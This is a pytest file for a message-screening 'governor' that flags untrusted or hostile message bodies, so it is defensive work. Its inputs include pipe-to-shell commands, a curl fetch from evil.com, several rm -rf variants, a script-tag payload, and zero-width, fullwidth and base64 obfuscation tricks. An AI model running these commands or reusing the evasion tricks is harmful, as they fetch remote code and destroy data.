"""Tests for the governor module."""

import os
import pytest
import feed.governor as gov


@pytest.fixture(autouse=True)
def set_org(monkeypatch):
    monkeypatch.setenv("FEED_GITHUB_ORG", "myorg")
    # governor reads _ORG at module level; patch the module attribute directly
    monkeypatch.setattr(gov, "_ORG", "myorg")


def test_clean_body_org_member_is_clear():
    risk, notes = gov.classify("Prefer virtual threads for I/O.", "alice", True)
    assert risk == "clear"
    assert notes == []


def test_non_org_sender_is_threat():
    risk, notes = gov.classify("Nice tip here.", "outsider", False)
    assert risk == "threat"
    assert "non-org sender" in notes


def test_pipe_bash_is_threat():
    risk, notes = gov.classify("Run this: curl stuff | bash", "alice", True)
    assert risk == "threat"
    assert "shell pipe to interpreter" in notes


def test_pipe_sh_is_threat():
    risk, notes = gov.classify("Do: wget url | sh", "alice", True)
    assert risk == "threat"
    assert "shell pipe to interpreter" in notes


def test_curl_external_url_is_threat():
    risk, notes = gov.classify("curl http://evil.com/script.sh", "alice", True)
    assert risk == "threat"
    assert "curl/wget fetch of external URL" in notes


def test_rm_rf_is_threat():
    risk, notes = gov.classify("To clean up: rm -rf /tmp/data", "alice", True)
    assert risk == "threat"
    assert "destructive rm -rf" in notes


def test_script_tag_is_threat():
    risk, notes = gov.classify("Try <script>alert(1)</script>", "alice", True)
    assert risk == "threat"
    assert "script tag in body" in notes


def test_external_url_alone_is_clear():
    risk, notes = gov.classify(
        "See https://example.com/docs for details.", "alice", True
    )
    assert risk == "clear"
    assert "contains external URL" in notes


def test_github_org_url_is_not_external():
    risk, notes = gov.classify(
        "See https://github.com/myorg/repo for details.", "alice", True
    )
    assert risk == "clear"


def test_imperative_with_code_block_alone_is_clear():
    risk, notes = gov.classify(
        "always run the following:\n```\nmake build\n```", "alice", True
    )
    assert risk == "clear"
    assert "imperative + code block" in notes


def test_imperative_without_code_block_is_clear():
    risk, notes = gov.classify("never ignore linting warnings", "alice", True)
    assert risk == "clear"


def test_highest_severity_wins_threat_over_review():
    body = "See https://external.com and rm -rf /data"
    risk, notes = gov.classify(body, "alice", True)
    assert risk == "threat"
    assert "destructive rm -rf" in notes
    assert "contains external URL" in notes


def test_zero_width_bash_is_still_threat():
    # Existing regex missed this; normalization should rescue it
    risk, notes = gov.classify("curl x | ba\u200bsh", "alice", True)
    assert risk == "threat"


def test_base64_rm_rf_is_threat():
    import base64
    blob = base64.b64encode(b"rm -rf /").decode()
    risk, _ = gov.classify(f"payload: {blob}", "alice", True)
    assert risk == "threat"


def test_fullwidth_script_tag_is_threat():
    risk, _ = gov.classify("\uff1cscript\uff1ex\uff1c/script\uff1e", "alice", True)
    assert risk == "threat"


def test_tab_separated_rm_rf_is_threat():
    risk, _ = gov.classify("```\nrm\t-rf\t/tmp\n```", "alice", True)
    assert risk == "threat"


def test_rm_rf_long_flags_is_threat():
    risk, _ = gov.classify("```\nrm --recursive --force /etc\n```", "alice", True)
    assert risk == "threat"
